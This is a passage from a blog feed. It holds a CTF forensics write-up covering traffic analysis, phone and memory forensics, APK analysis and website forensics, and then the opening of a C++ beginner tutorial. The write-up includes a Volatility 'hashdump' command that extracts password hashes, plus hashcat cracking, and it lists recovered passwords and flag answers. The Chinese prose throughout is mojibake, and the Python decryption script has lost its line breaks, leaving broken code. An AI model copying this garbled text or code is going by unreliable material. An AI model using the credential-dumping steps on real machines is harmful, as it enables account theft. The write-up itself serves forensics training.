<h3 id="domainhacker2"><a href="#domainhacker2" class="headerlink" title="domainhacker2"></a>domainhacker2</h3><p>åŒä¸Šé¢˜ï¼Œè¿½è¸ªåˆ°åŠ å¯†å‹ç¼©åŒ…çš„æµé‡ï¼Œæµ27</p>
<p><img src="https://img-blog.csdnimg.cn/8d83cc84009740bab2a602914c2fb9b8.png" alt="å›¾ç‰‡"></p>
<p>ç„¶åè§£ç ä¸€ä¸‹å¾—åˆ°å‹ç¼©åŒ…å¯†ç ï¼Œæ³¨æ„æœ€åè¿˜è¦åŠ ä¸Šé‚£ä¸ª$ç¬¦å·</p>
<p><img src="https://img-blog.csdnimg.cn/7591ac2c6e6a459096524196534b2783.png" alt="å›¾ç‰‡"></p>
<p>è§£ç ä¹‹åè¯»å–ä¹‹å‰æ‰€æœ‰çš„historyå€¼</p>
<p><img src="https://img-blog.csdnimg.cn/42ef08f41d254099983c39b0680bb584.png" alt="å›¾ç‰‡"></p>
<p>ç„¶åå°è¯•å‡ ä¸ªå¯†ç å°±è¡Œï¼Œæœ€åå¾—åˆ°æ˜¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">07ab403ab740c1540c378b0f5aaa4087</span><br></pre></td></tr></table></figure>

<h2 id="ç”µå­å–è¯"><a href="#ç”µå­å–è¯" class="headerlink" title="ç”µå­å–è¯"></a>ç”µå­å–è¯</h2><p><img src="https://img-blog.csdnimg.cn/e950d1f5bf6040c68f7b630c4fd1d00a.png" alt="å›¾ç‰‡"></p>
<h3 id="æ‰‹æœºå–è¯-1"><a href="#æ‰‹æœºå–è¯-1" class="headerlink" title="æ‰‹æœºå–è¯_1"></a>æ‰‹æœºå–è¯_1</h3><p><img src="https://img-blog.csdnimg.cn/18f1acb781cc47e291bc91cf8f811775.png" alt="å›¾ç‰‡"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">360x360</span><br></pre></td></tr></table></figure>

<h3 id="æ‰‹æœºå–è¯-2"><a href="#æ‰‹æœºå–è¯-2" class="headerlink" title="æ‰‹æœºå–è¯_2"></a>æ‰‹æœºå–è¯_2</h3><p><img src="https://img-blog.csdnimg.cn/e690b4d93e8f40e086be4053f3aaafb4.png" alt="å›¾ç‰‡"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SF1142358694796</span><br></pre></td></tr></table></figure>

<h3 id="è®¡ç®—æœºå–è¯-1"><a href="#è®¡ç®—æœºå–è¯-1" class="headerlink" title="è®¡ç®—æœºå–è¯_1"></a>è®¡ç®—æœºå–è¯_1</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 vol.py -f 1.dmp imageinfo å¾—åˆ°é•œåƒç‰ˆæœ¬Win7SP1x64</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/bc9d690633764221b6990a95400c00a2.jpeg" alt="å›¾ç‰‡"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 vol.py -f 1.dmp --profile=Win7SP1x64 hashdump hashdumpæŸ¥çœ‹å¯†ç çš„hash</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/57e679de3441401894f78d20541baffc.png" alt="å›¾ç‰‡"></p>
<p>æ‹¿å»somd5è§£å¯†å¾—åˆ°å¯†ç </p>
<p><img src="https://img-blog.csdnimg.cn/453b24abc79a49ea91d0ddad5dfa219d.png" alt="å›¾ç‰‡"></p>
<h3 id="è®¡ç®—æœºå–è¯-2"><a href="#è®¡ç®—æœºå–è¯-2" class="headerlink" title="è®¡ç®—æœºå–è¯_2"></a>è®¡ç®—æœºå–è¯_2</h3><p><img src="https://img-blog.csdnimg.cn/9b8d14b52f124c828cf32839a9f02a79.png" alt="å›¾ç‰‡"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2192</span><br></pre></td></tr></table></figure>

<h3 id="è®¡ç®—æœºå–è¯-3"><a href="#è®¡ç®—æœºå–è¯-3" class="headerlink" title="è®¡ç®—æœºå–è¯_3"></a>è®¡ç®—æœºå–è¯_3</h3><p>ç”¨</p>
<p><img src="https://img-blog.csdnimg.cn/f62d49e096694ef8841c35387232c0fa.png" alt="å›¾ç‰‡"></p>
<p>ç„¶åè§£å¯†ç§˜é’¥</p>
<p><img src="https://img-blog.csdnimg.cn/ca6184b86ad1469ea83619cc680e57fd.png" alt="å›¾ç‰‡"></p>
<p>ç„¶åè§£é”ï¼Œå¾—åˆ°å­—å…¸è·Ÿå¯†æ–‡</p>
<p><img src="https://img-blog.csdnimg.cn/5f779b635dc743bdb6677cc7ce6f6561.png" alt="å›¾ç‰‡"></p>
<p>hashcatçˆ†ç ´</p>
<p><img src="https://img-blog.csdnimg.cn/560da10ef21e44d8aa62fae1a0eca232.png" alt="å›¾ç‰‡"></p>
<p><img src="https://img-blog.csdnimg.cn/f8dd7444f64a4a06a2db0e917504c350.png" alt="å›¾ç‰‡"></p>
<p><img src="https://img-blog.csdnimg.cn/49410a763a354720bd260090fd80c685.png" alt="å›¾ç‰‡"></p>
<h3 id="è®¡ç®—æœºå–è¯-4"><a href="#è®¡ç®—æœºå–è¯-4" class="headerlink" title="è®¡ç®—æœºå–è¯_4"></a>è®¡ç®—æœºå–è¯_4</h3><p>dumpä¸‹TrueCrypt</p>
<p><img src="https://img-blog.csdnimg.cn/abc8ef88e50d42fda981b16e36a1596f.png" alt="å›¾ç‰‡"></p>
<p>ç„¶åforemoståˆ†è§£ï¼Œé‡Œé¢æœ‰ä¸€ä¸ªzipï¼Œæ²¡å•¥æœ‰ç”¨ä¿¡æ¯äº†ï¼Œçˆ†ç ´ä¸€ä¸‹</p>
<p><img src="https://img-blog.csdnimg.cn/e585f244f65e422bad71b36749e37191.png" alt="å›¾ç‰‡"></p>
<p><img src="https://img-blog.csdnimg.cn/2228be6a7681420bb5d0f881850f2384.png" alt="å›¾ç‰‡"></p>
<p>è§£å‹å¾—åˆ°flag</p>
<p><img src="https://img-blog.csdnimg.cn/ea95742db379454fbe3fc0756729291c.png" alt="å›¾ç‰‡"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;1349934913913991394cacacacacacc&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ç¨‹åºåˆ†æ-1"><a href="#ç¨‹åºåˆ†æ-1" class="headerlink" title="ç¨‹åºåˆ†æ_1"></a>ç¨‹åºåˆ†æ_1</h3><p><img src="https://img-blog.csdnimg.cn/019972169936407c95a74bb7b7b6f2c6.png" alt="å›¾ç‰‡"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exec.azj.kny.d.c</span><br></pre></td></tr></table></figure>

<h3 id="ç¨‹åºåˆ†æ-2"><a href="#ç¨‹åºåˆ†æ-2" class="headerlink" title="ç¨‹åºåˆ†æ_2"></a>ç¨‹åºåˆ†æ_2</h3><p><img src="https://img-blog.csdnimg.cn/a91426d0c34343eba77925f1aaf00d28.png" alt="å›¾ç‰‡"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">minmtta.hemjcbm.ahibyws.MainActivity</span><br></pre></td></tr></table></figure>

<h3 id="ç¨‹åºåˆ†æ-3"><a href="#ç¨‹åºåˆ†æ-3" class="headerlink" title="ç¨‹åºåˆ†æ_3"></a>ç¨‹åºåˆ†æ_3</h3><p><img src="https://img-blog.csdnimg.cn/9b09a9cf81784bdba6a3cdaefcb1c992.png" alt="å›¾ç‰‡"></p>
<p>å¯†æ–‡å³æ˜¯base64ç¼–ç </p>
<h3 id="ç¨‹åºåˆ†æ-4"><a href="#ç¨‹åºåˆ†æ-4" class="headerlink" title="ç¨‹åºåˆ†æ_4"></a>ç¨‹åºåˆ†æ_4</h3><p><img src="https://img-blog.csdnimg.cn/1b9843e6ecee4c52adc1b87cd6154e9f.png" alt="å›¾ç‰‡"></p>
<p>ç®€å•åˆ†æä¸€ä¸‹ï¼Œb(),a()æ˜¯å‡½æ•°ï¼Œaæ˜¯ç±»åï¼Œæ‰€ä»¥å°±å•ä¸€ä¸ªa</p>
<p><img src="https://img-blog.csdnimg.cn/368309f9ff5f43bd9fae31db5851200f.png" alt="å›¾ç‰‡"></p>
<h3 id="ç½‘ç«™å–è¯-1"><a href="#ç½‘ç«™å–è¯-1" class="headerlink" title="ç½‘ç«™å–è¯_1"></a>ç½‘ç«™å–è¯_1</h3><p>ç«ç»’æ‰«ä¸€æ‰«</p>
<p><img src="https://img-blog.csdnimg.cn/4167a00fc72b4e698b410148f0b99e0d.png" alt="å›¾ç‰‡"></p>
<p><img src="https://img-blog.csdnimg.cn/94896499fed2492c8946f8413dea02c7.png" alt="å›¾ç‰‡"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lanmaobei666</span><br></pre></td></tr></table></figure>

<h3 id="ç½‘ç«™å–è¯-2"><a href="#ç½‘ç«™å–è¯-2" class="headerlink" title="ç½‘ç«™å–è¯_2"></a>ç½‘ç«™å–è¯_2</h3><p><img src="https://img-blog.csdnimg.cn/554d135268ad4ad492d19fc87fb7d78b.png" alt="å›¾ç‰‡"></p>
<p>ç„¶åè·Ÿè¸ª</p>
<p><img src="https://img-blog.csdnimg.cn/0b8d9b5901ff431baeb1d4724d985a3e.png" alt="å›¾ç‰‡"></p>
<p>æ‰¾ä¸ª7.1ä»¥ä¸‹ç‰ˆæœ¬çš„phpè·‘ä¸€ä¸‹ï¼Œå› ä¸º7.1ä»¥ä¸Šæ²¡æœ‰mcxxxxxxé‚£ä¸ªå‡½æ•°äº†</p>
<p><img src="https://img-blog.csdnimg.cn/d9869b5bf8fb4e81be56f4001c970f62.png" alt="å›¾ç‰‡"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">KBLT123</span><br></pre></td></tr></table></figure>

<h3 id="ç½‘ç«™å–è¯-3"><a href="#ç½‘ç«™å–è¯-3" class="headerlink" title="ç½‘ç«™å–è¯_3"></a>ç½‘ç«™å–è¯_3</h3><p><img src="https://img-blog.csdnimg.cn/21a40ec6dfec425995159b3f44c8e76b.png" alt="å›¾ç‰‡"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jyzg123456</span><br></pre></td></tr></table></figure>

<h3 id="ç½‘ç«™å–è¯-4"><a href="#ç½‘ç«™å–è¯-4" class="headerlink" title="ç½‘ç«™å–è¯_4"></a>ç½‘ç«™å–è¯_4</h3><p><img src="https://img-blog.csdnimg.cn/80b7d57e75c4472ab11327f33a71a3cc.png" alt="å›¾ç‰‡"></p>
<p>åŠ å¯†å‡½æ•°</p>
<p><img src="https://img-blog.csdnimg.cn/6eb66d21c72a4982bc1acaf13dbdd350.png" alt="å›¾ç‰‡"></p>
<p>å¼ å®3ï¼Œç‹å­è±ª5ï¼Œæå–ä¸€ä¸‹ï¼Œå…ˆ5å3</p>
<p><img src="https://img-blog.csdnimg.cn/fcc5c15b517949ce8fac59c1653e034f.png" alt="å›¾ç‰‡"></p>
<p>ç„¶åå†™è§£å¯†è„šæœ¬ï¼Œè¦ä¹˜ä¸Šæ¯å¤©çš„æ±‡ç‡</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#[[&#x27;mZVymm9t&#x27;, &#x27;lpxqlXFo&#x27;, &#x27;l5xummto&#x27;, &#x27;m5Zwm3Bn&#x27;, &#x27;nJhtlGlm&#x27;, &#x27;m5tpmGtm&#x27;, &#x27;m5ptnGtu&#x27;, &#x27;mZlym25r&#x27;, &#x27;m5hpnHBu&#x27;, &#x27;m5prlm9u&#x27;, &#x27;nJlyl2hu&#x27;, &#x27;lptummhs&#x27;, &#x27;lpxrl21n&#x27;], [&#x27;mZRpnHBs&#x27;, &#x27;mZpxm2lr&#x27;, &#x27;m5dtmGls&#x27;, &#x27;mpxvlnBv&#x27;, &#x27;mJpynHBt&#x27;, &#x27;nJZwm2lu&#x27;, &#x27;mpdtnWxq&#x27;, &#x27;nJdtlmpr&#x27;, &#x27;mZtymHBm&#x27;, &#x27;nJlslmpp&#x27;], [&#x27;l5RunW1p&#x27;, &#x27;nJxplXFm&#x27;, &#x27;lZdpmm1s&#x27;, &#x27;mZZwnW9u&#x27;, &#x27;mJVrmmhp&#x27;, &#x27;lZZwl3Bs&#x27;, &#x27;m5xvm2hm&#x27;, &#x27;mpZslmpm&#x27;, &#x27;mZtrnGtp&#x27;, &#x27;lp1rm21t&#x27;, &#x27;nJxplmtp&#x27;], [&#x27;l5twlXFq&#x27;, &#x27;lphqmm9s&#x27;, &#x27;m51wmG1q&#x27;, &#x27;mJlxlWto&#x27;, &#x27;lJ1vmXFq&#x27;, &#x27;mpVpmW5r&#x27;, &#x27;m5lrlGpr&#x27;, &#x27;mpxplm9u&#x27;, &#x27;lZpxnHFn&#x27;], [&#x27;nJdymWpm&#x27;, &#x27;mJpum3Fo&#x27;, &#x27;lpRrmWto&#x27;, &#x27;lZtunXBv&#x27;, &#x27;lpprnWtt&#x27;, &#x27;lJdslnBr&#x27;], [&#x27;lJZrnWpm&#x27;, &#x27;l5Zrm21m&#x27;, &#x27;lJdul2hm&#x27;, &#x27;mphylG9q&#x27;, &#x27;lZhpm2pp&#x27;, &#x27;lZ1qnW1s&#x27;, &#x27;nJ1tlHFp&#x27;, &#x27;mZxqm2tp&#x27;, &#x27;mZdsm21t&#x27;, &#x27;mpRvlG9o&#x27;, &#x27;mJVqlmhv&#x27;, &#x27;mJRwlHBq&#x27;], [&#x27;l5dtmWtt&#x27;, &#x27;mZdylHFt&#x27;, &#x27;l5RqlWxn&#x27;, &#x27;mZ1um3Fs&#x27;, &#x27;lJ1rnWhu&#x27;, &#x27;m5pulWhv&#x27;, &#x27;lptrnW1u&#x27;, &#x27;m5xynWxn&#x27;, &#x27;lpRynGtr&#x27;, &#x27;mpxulGlm&#x27;, &#x27;nJdslm9r&#x27;, &#x27;lJhslHBq&#x27;, &#x27;nJpwnWhu&#x27;], [&#x27;mptql2tv&#x27;, &#x27;l51xmmlp&#x27;, &#x27;mZVymXFn&#x27;, &#x27;lJhqnW5q&#x27;, &#x27;m5ppmGpr&#x27;, &#x27;mZlqm21t&#x27;, &#x27;mpZslWxt&#x27;], [&#x27;mJ1pnHFm&#x27;, &#x27;l5drlXBp&#x27;, &#x27;mJlvmW1u&#x27;, &#x27;mZtxlG5t&#x27;, &#x27;nJtsnHFn&#x27;, &#x27;l5Rvm29o&#x27;, &#x27;m5xvlWxv&#x27;, &#x27;m5Zrl2xm&#x27;], [&#x27;mZlwlG1u&#x27;, &#x27;nJpvlWtr&#x27;, &#x27;mJxym25s&#x27;, &#x27;lpVqnWxv&#x27;, &#x27;mZVvl3Fq&#x27;, &#x27;lZVtlW5m&#x27;, &#x27;lZRqlGhn&#x27;, &#x27;nJxqm2hn&#x27;, &#x27;nJVtl21s&#x27;], [&#x27;lJdumWlq&#x27;, &#x27;mJtxmGtp&#x27;, &#x27;mZxsnHFv&#x27;, &#x27;lpdtl2xn&#x27;, &#x27;mphqlm5p&#x27;, &#x27;lJdxlGpn&#x27;], [&#x27;lpVvlHFu&#x27;, &#x27;lJhvmHBn&#x27;, &#x27;l5xunGtv&#x27;, &#x27;lZRul2pt&#x27;, &#x27;mpdqnGxu&#x27;, &#x27;l5Zxlmho&#x27;, &#x27;lJppmWhq&#x27;, &#x27;nJVylWpp&#x27;, &#x27;m5VxnWlr&#x27;], [&#x27;lpdsnGtq&#x27;, &#x27;mZ1tnGpt&#x27;, &#x27;mJVqmmtq&#x27;, &#x27;l5hslWhm&#x27;, &#x27;lZZtl21r&#x27;, &#x27;nJlumGlm&#x27;, &#x27;lJhsmW9t&#x27;], [&#x27;lZZym25s&#x27;, &#x27;l5tpnHBt&#x27;, &#x27;nJVunG1q&#x27;, &#x27;mJdtlHFu&#x27;, &#x27;mpVtlnFp&#x27;, &#x27;mplrnG1t&#x27;, &#x27;mJ1ylHBr&#x27;, &#x27;nJhynG5m&#x27;, &#x27;mplymG1r&#x27;], [&#x27;lJtxlGxo&#x27;, &#x27;lpRxnGlm&#x27;, &#x27;mZxwnG5s&#x27;, &#x27;mZptnWpn&#x27;, &#x27;mJZylGxq&#x27;, &#x27;mZZvm3Fo&#x27;], [&#x27;lJdxnW9t&#x27;, &#x27;lZtxmXFv&#x27;, &#x27;nJxtlXFm&#x27;, &#x27;mJZumW1r&#x27;, &#x27;nJ1tmG1p&#x27;, &#x27;mplslmpu&#x27;, &#x27;lJZxlG5p&#x27;, &#x27;nJtxmXBq&#x27;], [&#x27;lZdxmmtq&#x27;, &#x27;lJdrlG1o&#x27;, &#x27;mpZtmmlm&#x27;, &#x27;mJVxnGpm&#x27;, &#x27;mJVwmWxu&#x27;, &#x27;mplslWps&#x27;]]#a=[0.04,0.06,0.05,0.07,0.10,0.15,0.17,0.23,0.22,0.25,0.29,0.20,0.28,0.33,0.35,0.35,0.37]import base64import hashlib</span><br><span class="line">def decryp(data):    key = b&#x27;jyzg123456&#x27;    key = hashlib.md5(key).hexdigest()    data = base64.b64decode(data)    x = 0    lenth = len(data)    l = len(key) char = &#x27;&#x27;    str = &#x27;&#x27; for i in range(lenth): if (x == l):            x = 0 char += key[x]        x += 1 for i in range(lenth): # print(data[i])        str += chr(data[i] - (ord(char[i])) % 256) return int(str)</span><br><span class="line">a1 = [[&#x27;mZVymm9t&#x27;, &#x27;lpxqlXFo&#x27;, &#x27;l5xummto&#x27;, &#x27;m5Zwm3Bn&#x27;, &#x27;nJhtlGlm&#x27;, &#x27;m5tpmGtm&#x27;, &#x27;m5ptnGtu&#x27;, &#x27;mZlym25r&#x27;, &#x27;m5hpnHBu&#x27;, &#x27;m5prlm9u&#x27;, &#x27;nJlyl2hu&#x27;, &#x27;lptummhs&#x27;, &#x27;lpxrl21n&#x27;], [&#x27;mZRpnHBs&#x27;, &#x27;mZpxm2lr&#x27;, &#x27;m5dtmGls&#x27;, &#x27;mpxvlnBv&#x27;, &#x27;mJpynHBt&#x27;, &#x27;nJZwm2lu&#x27;, &#x27;mpdtnWxq&#x27;, &#x27;nJdtlmpr&#x27;, &#x27;mZtymHBm&#x27;, &#x27;nJlslmpp&#x27;], [&#x27;l5RunW1p&#x27;, &#x27;nJxplXFm&#x27;, &#x27;lZdpmm1s&#x27;, &#x27;mZZwnW9u&#x27;, &#x27;mJVrmmhp&#x27;, &#x27;lZZwl3Bs&#x27;, &#x27;m5xvm2hm&#x27;, &#x27;mpZslmpm&#x27;, &#x27;mZtrnGtp&#x27;, &#x27;lp1rm21t&#x27;, &#x27;nJxplmtp&#x27;], [&#x27;l5twlXFq&#x27;, &#x27;lphqmm9s&#x27;, &#x27;m51wmG1q&#x27;, &#x27;mJlxlWto&#x27;, &#x27;lJ1vmXFq&#x27;, &#x27;mpVpmW5r&#x27;, &#x27;m5lrlGpr&#x27;, &#x27;mpxplm9u&#x27;, &#x27;lZpxnHFn&#x27;], [&#x27;nJdymWpm&#x27;, &#x27;mJpum3Fo&#x27;, &#x27;lpRrmWto&#x27;, &#x27;lZtunXBv&#x27;, &#x27;lpprnWtt&#x27;, &#x27;lJdslnBr&#x27;], [&#x27;lJZrnWpm&#x27;, &#x27;l5Zrm21m&#x27;, &#x27;lJdul2hm&#x27;, &#x27;mphylG9q&#x27;, &#x27;lZhpm2pp&#x27;, &#x27;lZ1qnW1s&#x27;, &#x27;nJ1tlHFp&#x27;, &#x27;mZxqm2tp&#x27;, &#x27;mZdsm21t&#x27;, &#x27;mpRvlG9o&#x27;, &#x27;mJVqlmhv&#x27;, &#x27;mJRwlHBq&#x27;], [&#x27;l5dtmWtt&#x27;, &#x27;mZdylHFt&#x27;, &#x27;l5RqlWxn&#x27;, &#x27;mZ1um3Fs&#x27;, &#x27;lJ1rnWhu&#x27;, &#x27;m5pulWhv&#x27;, &#x27;lptrnW1u&#x27;, &#x27;m5xynWxn&#x27;, &#x27;lpRynGtr&#x27;, &#x27;mpxulGlm&#x27;, &#x27;nJdslm9r&#x27;, &#x27;lJhslHBq&#x27;, &#x27;nJpwnWhu&#x27;], [&#x27;mptql2tv&#x27;, &#x27;l51xmmlp&#x27;, &#x27;mZVymXFn&#x27;, &#x27;lJhqnW5q&#x27;, &#x27;m5ppmGpr&#x27;, &#x27;mZlqm21t&#x27;, &#x27;mpZslWxt&#x27;], [&#x27;mJ1pnHFm&#x27;, &#x27;l5drlXBp&#x27;, &#x27;mJlvmW1u&#x27;, &#x27;mZtxlG5t&#x27;, &#x27;nJtsnHFn&#x27;, &#x27;l5Rvm29o&#x27;, &#x27;m5xvlWxv&#x27;, &#x27;m5Zrl2xm&#x27;], [&#x27;mZlwlG1u&#x27;, &#x27;nJpvlWtr&#x27;, &#x27;mJxym25s&#x27;, &#x27;lpVqnWxv&#x27;, &#x27;mZVvl3Fq&#x27;, &#x27;lZVtlW5m&#x27;, &#x27;lZRqlGhn&#x27;, &#x27;nJxqm2hn&#x27;, &#x27;nJVtl21s&#x27;], [&#x27;lJdumWlq&#x27;, &#x27;mJtxmGtp&#x27;, &#x27;mZxsnHFv&#x27;, &#x27;lpdtl2xn&#x27;, &#x27;mphqlm5p&#x27;, &#x27;lJdxlGpn&#x27;], [&#x27;lpVvlHFu&#x27;, &#x27;lJhvmHBn&#x27;, &#x27;l5xunGtv&#x27;, &#x27;lZRul2pt&#x27;, &#x27;mpdqnGxu&#x27;, &#x27;l5Zxlmho&#x27;, &#x27;lJppmWhq&#x27;, &#x27;nJVylWpp&#x27;, &#x27;m5VxnWlr&#x27;], [&#x27;lpdsnGtq&#x27;, &#x27;mZ1tnGpt&#x27;, &#x27;mJVqmmtq&#x27;, &#x27;l5hslWhm&#x27;, &#x27;lZZtl21r&#x27;, &#x27;nJlumGlm&#x27;, &#x27;lJhsmW9t&#x27;], [&#x27;lZZym25s&#x27;, &#x27;l5tpnHBt&#x27;, &#x27;nJVunG1q&#x27;, &#x27;mJdtlHFu&#x27;, &#x27;mpVtlnFp&#x27;, &#x27;mplrnG1t&#x27;, &#x27;mJ1ylHBr&#x27;, &#x27;nJhynG5m&#x27;, &#x27;mplymG1r&#x27;], [&#x27;lJtxlGxo&#x27;, &#x27;lpRxnGlm&#x27;, &#x27;mZxwnG5s&#x27;, &#x27;mZptnWpn&#x27;, &#x27;mJZylGxq&#x27;, &#x27;mZZvm3Fo&#x27;], [&#x27;lJdxnW9t&#x27;, &#x27;lZtxmXFv&#x27;, &#x27;nJxtlXFm&#x27;, &#x27;mJZumW1r&#x27;, &#x27;nJ1tmG1p&#x27;, &#x27;mplslmpu&#x27;, &#x27;lJZxlG5p&#x27;, &#x27;nJtxmXBq&#x27;], [&#x27;lZdxmmtq&#x27;, &#x27;lJdrlG1o&#x27;, &#x27;mpZtmmlm&#x27;, &#x27;mJVxnGpm&#x27;, &#x27;mJVwmWxu&#x27;, &#x27;mplslWps&#x27;]]a = [0.04, 0.06, 0.05, 0.07, 0.10, 0.15, 0.17, 0.23, 0.22, 0.25, 0.29, 0.20, 0.28, 0.33, 0.35, 0.35, 0.37]s = []for i in range(len(a1)):    ss = 0 for j in range(len(a1[i])):        ss += decryp(a1[i][j].encode())    s.append(ss * a[i])print(s)print(sum(s))#15758353.760000002</span><br></pre></td></tr></table></figure>

<p>ä¿ç•™ä¸¤ä½ï¼Œæäº¤15758353.76</p>
]]></content>
      <categories>
        <category>å‚åŠ çš„å„ç§æ¯”èµ›</category>
      </categories>
      <tags>
        <tag>è“å¸½æ¯</tag>
        <tag>wp</tag>
        <tag>æ ¡é˜Ÿ</tag>
      </tags>
  </entry>
  <entry>
    <title>Cè‰¹ä»å…¥é—¨åˆ°å…¥åœŸ</title>
    <url>/2022/02/10/C%E8%89%B9%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E5%9C%9F/</url>
    <content><![CDATA[<h3 id="ä¸€ã€å…¥é—¨"><a href="#ä¸€ã€å…¥é—¨" class="headerlink" title="ä¸€ã€å…¥é—¨"></a>ä¸€ã€å…¥é—¨</h3><p>å›½é™…æƒ¯ä¾‹ï¼Œè¾“å‡º<code>hello world</code></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">10</span>];</span><br><span class="line">    cin &gt;&gt; name;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;your name is:&quot;</span>&lt;&lt;name&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç”±äºå­¦è¿‡cï¼Œæ‰€ä»¥ç›¸åŒçš„ä¸œè¥¿å°±ä¸è¿‡å¤šèµ˜è¿°äº†</p>
<span id="more"></span>

<h4 id="1-forå¾ªç¯ç»ƒä¹ "><a href="#1-forå¾ªç¯ç»ƒä¹ " class="headerlink" title="1.forå¾ªç¯ç»ƒä¹ "></a>1.forå¾ªç¯ç»ƒä¹ </h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= <span class="number">100</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(i % <span class="number">7</span> == <span class="number">0</span> || i % <span class="number">10</span> == <span class="number">7</span> || (i / <span class="number">10</span> ) % <span class="number">10</span> == <span class="number">7</span>)&#123;</span><br><span class="line">            cout &lt;&lt; i &lt;&lt; endl;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-è·³è½¬è¯­å¥ä¹‹gotoè¯­å¥"><a href="#2-è·³è½¬è¯­å¥ä¹‹gotoè¯­å¥" class="headerlink" title="2.è·³è½¬è¯­å¥ä¹‹gotoè¯­å¥"></a>2.è·³è½¬è¯­å¥ä¹‹gotoè¯­å¥</h4><p>ï¼ˆä¸æ€ä¹ˆä½¿ç”¨</p>
<p><strong>ä½œç”¨ï¼š</strong>æ— æ¡ä»¶è·³è½¬è¯­å¥</p>
<p><strong>è¯­æ³•ï¼š</strong><code>goto æ ‡è®°;</code></p>
<p><strong>è§£é‡Šï¼š</strong>å¦‚æœæ ‡è®°çš„åç§°å­˜åœ¨ï¼Œæ‰§è¡Œåˆ°gotoè¯­å¥æ—¶ï¼Œä¼šè·³è½¬åˆ°æ ‡è®°çš„ä½ç½®</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;1 xxx&quot;</span> &lt;&lt;endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;2 xxx&quot;</span> &lt;&lt;endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;3 xxx&quot;</span> &lt;&lt;endl;</span><br><span class="line">    <span class="keyword">goto</span> FLAG;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;4 xxx&quot;</span> &lt;&lt;endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;5 xxx&quot;</span> &lt;&lt;endl;</span><br><span class="line">    FLAG:</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;6 xxx&quot;</span> &lt;&lt;endl;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;7 xxx&quot;</span> &lt;&lt;endl;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="äºŒã€ç±»å’Œå¯¹è±¡"><a href="#äºŒã€ç±»å’Œå¯¹è±¡" class="headerlink" title="äºŒã€ç±»å’Œå¯¹è±¡"></a>äºŒã€ç±»å’Œå¯¹è±¡</h3><h4 id="2-1-å°è£…"><a href="#2-1-å°è£…" class="headerlink" title="2.1 å°è£…"></a>2.1 å°è£…</h4><p>å°†å±æ€§å’Œè¡Œä¸ºä½œä¸ºä¸€ä¸ªæ•´ä½“ï¼Œè¡¨ç°ç”Ÿæ´»ä¸­çš„äº‹ç‰©å¹¶å¯¹å±æ€§å’Œè¡Œä¸ºåŠ ä»¥æƒé™æ§åˆ¶ã€‚</p>
<p>è¯­æ³•ï¼š<code>class ClassName&#123; &#125;;</code></p>
<p>å®ä¾‹1ï¼šè®¾è®¡ä¸€ä¸ªåœ†ç±»ï¼Œæ±‚åœ†çš„é¢ç§¯</p>
